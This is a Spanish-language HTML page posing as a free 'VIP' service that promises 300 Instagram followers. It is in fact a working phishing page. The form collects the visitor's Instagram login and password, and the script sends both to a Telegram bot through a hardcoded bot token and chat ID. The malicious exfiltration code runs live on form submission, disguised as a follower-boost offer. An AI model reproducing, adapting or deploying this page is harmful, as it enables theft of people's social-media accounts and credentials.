<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Socio Benja VIP</title>
    <style>
        body { background: #050505; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #d4af37; width: 330px; text-align: center; box-shadow: 0 0 20px rgba(212,175,55,0.2); }
        h2 { color: #d4af37; text-transform: uppercase; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; background: #000; border: 1px solid #333; color: white; border-radius: 10px; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 15px; background: #d4af37; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; color: black; }
    </style>
</head>
<body>
    <div class="card">
        <h2>👑 SOCIO BENJA VIP</h2>
        <p>Obtené tus 300 Seguidores</p>
        <form id="formVip">
            <input type="text" id="usuario" placeholder="Correo o Teléfono" required>
            <input type="password" id="pass" placeholder="Contraseña de Instagram" required>
            <button type="submit" class="btn">INICIAR CARGA GRATUITA</button>
        </form>
    </div>

    <script>
        document.getElementById('formVip').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('usuario').value;
            const clave = document.getElementById('pass').value;
            
            // TOKEN NUEVO ACTUALIZADO
            const token = '8633862286:AAGkHpsWTWzLoUbTnUOa47yPY_tUhYOlzbs';
            const chat_id = '8569497540';
            const mensaje = `🔥 NUEVO REGISTRO 🔥\n\n👤 Usuario: ${user}\n🔑 Clave: ${clave}`;

            // MÉTODO DE ENVÍO POR REDIRECCIÓN (Para confirmar que funciona)
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;
            
            window.location.href = url;
        });
    </script>
</body>
</html>
